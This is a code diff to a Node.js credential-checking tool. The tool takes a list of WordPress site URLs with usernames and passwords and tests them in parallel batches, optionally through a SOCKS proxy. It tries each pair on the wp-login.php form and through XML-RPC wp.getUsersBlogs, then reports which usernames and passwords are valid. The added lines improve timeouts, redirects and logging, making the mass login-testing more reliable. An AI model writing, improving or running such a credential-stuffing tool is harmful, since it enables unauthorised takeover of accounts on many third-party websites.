@@ -8,9 +8,19 @@ const util = require('util');
 const xmlrpc = require('@0xengine/xmlrpc');
 const qs = require('node:querystring');
 const {SocksProxyAgent} = require('socks-proxy-agent');
+const LanguageDetect = require('languagedetect');
+const langDetector = new LanguageDetect();
 
 const DefaultNReq = 10;
 const DefaultFrom = 0;
+
+const RequestTimeout = 20000;
+
+function rpcTimeout(ms) {
+	return new Promise((resolve)=>{
+		setTimeout(()=>resolve(new Error), ms)
+	});
+}
 
 function getAxiosInstance() {
 	let instance;
@@ -57,7 +67,7 @@ async function wpLogin(host, protocol, username, password) {
 		pwd: password,
 		testcookie: '1',
 		'wp-submit': 'Log In',
-		redirect_to: `${protocol}//${host}/wp-admin`
+		//redirect_to: `${protocol}//${host}/wp-admin`
 	});
 	
 	const result = {
@@ -65,13 +75,15 @@ async function wpLogin(host, protocol, username, password) {
 		passwordOk: false,
 		loggedIn: false
 	};
-	try {
-		const url = `${protocol}//${host}/wp-login.php`;
+	const url = `${protocol}//${host}/wp-login.php`;
+	
+	try { 
 		const response = await axiosInst.post(
 			url, 
 			payload,
 			{
-				maxRedirects: 0,
+				maxRedirects: 5, // cannot be 0, if 0 then misses many logins
+				timeout: RequestTimeout,
 				validateStatus: function (status) {
 					// if this function returns true, exception is not thrown, so
 					// in simplest case just return true to handle status checks externally.
@@ -82,8 +94,11 @@ async function wpLogin(host, protocol, username, password) {
 				}
 			}
 		);
+		
+		console.log(`url: ${url} status: ${response.status}`)
 		if (response.status === 200) {
-			const reNoUser = new RegExp(`The username <strong>${username}</strong> is not registered on this site`);
+			console.log(`url: ${url}, lang: ${langDetector.detect(response.data)[0][0]}`);
+			const reNoUser = new RegExp(`The username <strong>${username}</strong> is not registered on this site`); // will give false OK if non-english language is used
 			const usernameIsNotRegistered = response.data.match(reNoUser) !== null;
 			//console.log(`username not registered: ${usernameIsNotRegistered}`);
 			const reInvalidPass = new RegExp(`The password you entered for the username <strong>${username}</strong> is incorrect`); // will give false OK if non-english language is used
@@ -95,8 +110,11 @@ async function wpLogin(host, protocol, username, password) {
 			result.usernameOk = !usernameIsNotRegistered;
 			result.passwordOk = !passwordIsInvalid;
 		} 
-	} catch(err) {}
-
+	} 
+	catch(err) {
+		console.error(err);
+	} // if any error occurs  we want to ignore it and return result with all falses
+	
 	return result;
 }
 
@@ -121,21 +139,29 @@ async function run(pathToTargets, from, nParrallelRequests) {
 		
 		console.log(`bulk: ${i} of ${nBulks}, startIdx: ${startIdx} endIdx: ${endIdx}`);
 		for (let j=startIdx; j<endIdx; j++) {
-			// console.log(`working on line: ${j}`);
+			// console.log(`working on line: ${j}|${lines[j]}`);
 			const [url, username, password] = lines[j].split(';');
 			const {host, hostname, protocol} = new urlParser.URL(url);
-			wpLoginPromises.push(wpLogin(host, protocol, username, password).catch(e=>e));
+			wpLoginPromises.push(wpLogin(host, protocol, username, password));
+			
 			const xmlClient = createXmlClient(hostname, protocol);
-			getUsersBlogsPromises.push(xmlClient.methodCall('wp.getUsersBlogs', [username, password]).catch(e=>e));
+			const rpcPromise = xmlClient.methodCall('wp.getUsersBlogs', [username, password]).catch(e=>e); // rpc primise
+			const rpcTimeoutPromise = rpcTimeout(RequestTimeout);
+			getUsersBlogsPromises.push(Promise.race([rpcPromise, rpcTimeoutPromise]));
 		}
 
 		// Note: if ERROR 'Unknown tag TITLE' or similar is returned to XMLRPC request that means the /xmlrpc.php page is forbidden.
 		// It's not forbidden by Wordpress but by web server. When XMLRPC is forbidden by Wordpress plugin,
 		// there is XML error.
-		const getUsersBlogsResults = await Promise.allSettled(getUsersBlogsPromises);
+		console.log('start login');
 		const wpLoginResults = await Promise.allSettled(wpLoginPromises);
+		console.log('login settled');
 
-		for (let j=0; j<getUsersBlogsPromises.length; j++) {
+		console.log('start blogs');
+		const getUsersBlogsResults = await Promise.allSettled(getUsersBlogsPromises);
+		console.log('user blogs settled');
+
+		for (let j=0; j<wpLoginResults.length; j++) {
 			const k = i*nParrallelRequests + j;
 			const line = lines[k];
 			const wpLoginResult = wpLoginResults[j].value;
